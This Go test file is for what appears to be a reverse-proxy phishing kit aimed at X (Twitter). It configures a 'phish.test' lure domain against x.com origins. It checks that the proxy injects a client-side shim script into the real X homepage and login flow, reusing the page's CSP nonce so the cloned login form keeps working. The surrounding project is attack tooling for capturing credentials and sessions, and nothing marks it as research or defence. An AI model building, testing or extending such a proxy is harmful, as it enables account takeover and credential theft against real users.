package main

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

// TestShimLiveInjection fetches the real X homepage through the proxy and
// verifies that (a) the client-side shim script is injected as the first child
// of <head> with the page's CSP nonce, and (b) /_xrp/shim.js is served with the
// origin config baked in. This is the end-to-end check for the login-form
// disappearance fix.
func TestShimLiveInjection(t *testing.T) {
	cfg := &config{
		phishDomain: "phish.test",
		targetURL:   &url.URL{Scheme: "https", Host: "x.com"},
		origins:     []string{"x.com", "twitter.com", "twimg.com", "pscp.tv"},
		dataDir:     "/tmp/lures_shim",
		insecure:    true,
	}
	px := newProxy(cfg, newStore(cfg.dataDir))
	srv := httptest.NewServer(http.HandlerFunc(px.ServeHTTP))
	defer srv.Close()
	client := srv.Client()

	// 1. Homepage -> shim injected with nonce.
	req, _ := http.NewRequest("GET", srv.URL+"/", nil)
	req.Host = "phish.test"
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("homepage fetch: %v", err)
	}
	html, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	nonce := cspNonce(resp.Header.Get("Content-Security-Policy"))
	if nonce == "" {
		t.Fatalf("no CSP nonce found in response; cannot verify shim nonce")
	}
	wantTag := `<script src="/_xrp/shim.js" nonce="` + nonce + `"></script>`
	if !strings.Contains(string(html), wantTag) {
		t.Fatalf("shim script tag %q not found in HTML (first 400 bytes: %.400s)", wantTag, html)
	}

	// 2. /_xrp/shim.js served locally with config baked in.
	req2, _ := http.NewRequest("GET", srv.URL+"/_xrp/shim.js", nil)
	req2.Host = "phish.test"
	resp2, err := client.Do(req2)
	if err != nil {
		t.Fatalf("shim fetch: %v", err)
	}
	shimBody, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()
	if resp2.StatusCode != http.StatusOK {
		t.Fatalf("shim status=%d, want 200", resp2.StatusCode)
	}
	if ct := resp2.Header.Get("Content-Type"); !strings.Contains(ct, "javascript") {
		t.Fatalf("shim content-type=%q, want javascript", ct)
	}
	s := string(shimBody)
	if strings.Contains(s, "__XRP_CONFIG__") {
		t.Fatalf("shim served with unresolved config placeholder")
	}
	if !strings.Contains(s, `"prefix":"/_xrp/"`) {
		t.Fatalf("shim config missing prefix")
	}

	// 3. /i/flow/login also gets the shim injected.
	req3, _ := http.NewRequest("GET", srv.URL+"/i/flow/login", nil)
	req3.Host = "phish.test"
	resp3, err := client.Do(req3)
	if err != nil {
		t.Fatalf("login fetch: %v", err)
	}
	loginHTML, _ := io.ReadAll(resp3.Body)
	resp3.Body.Close()
	if !strings.Contains(string(loginHTML), "/_xrp/shim.js") {
		t.Fatalf("shim not injected into /i/flow/login HTML")
	}

	t.Logf("OK: shim injected with nonce=%q and served at /_xrp/shim.js (%d bytes)", nonce, len(shimBody))
}
